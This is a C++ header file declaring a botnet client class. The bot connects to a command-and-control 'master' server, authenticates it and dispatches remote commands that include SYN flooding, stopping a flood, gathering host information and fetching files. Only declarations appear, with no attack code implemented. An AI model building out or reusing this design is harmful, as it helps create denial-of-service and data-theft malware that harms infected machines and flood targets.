#ifndef BOT_H
#define BOT_H

#include "../Socket/TCPSocket.h"
#include <vector>

namespace botnet {

class Bot {
public:
	Bot();
	~Bot() = default;

	/**
	* Connect to running Botnet server.
	* host - IP address or DNS name. e.g. "192.168.1.2" or "botnetServer.net".
	* port - Server port, as string.
	* Return value: returns if managed to successfuly connect to the server.
	*/
	bool ConnectToMaster(const std::string& host, const std::string& port);

	void ListenToMaster();


private:
	/**
	* When adding a command add its name to the enum Commands,
	* and to the "commands" vector below in the same order.
	* Make sure also to write a void(void) function that executes the command
	* and it to the "func_vector" below, also in the same order as the enum.
	*/
	typedef enum { KEEP_ALIVE, PRINT_BOTS, SYN_FLOOD, STOP_FLOOD, GET_INFO, GET_FILE, ARG_CNT } Commands;
	typedef void (Bot::*CommandFunction)();
	CommandFunction GetCommandFunction(Commands command) {
		static const std::vector<CommandFunction> func_vector = {
			 &Bot::KeepAlive
			, &Bot::NO_FUNCTION
			, &Bot::SYNFlood
			, &Bot::StopFlood
			, &Bot::GetInfo
			, &Bot::GetFile
		};

		return func_vector[command];
	};


	tcpSocket server_connection;

	/**
	* Checks if server connected to is really a botnet server.
	*/
	bool AuthenticateServer();

	void FlushIncoming();

	/* Botnet command functions */

	void KeepAlive();
	// For commands that have no functions
	void NO_FUNCTION() { };
	void SYNFlood();
	void StopFlood();
	void GetInfo();
	void GetFile();

	/* Botnet command function helpers */

	std::string GetOsName();

};

}

#endif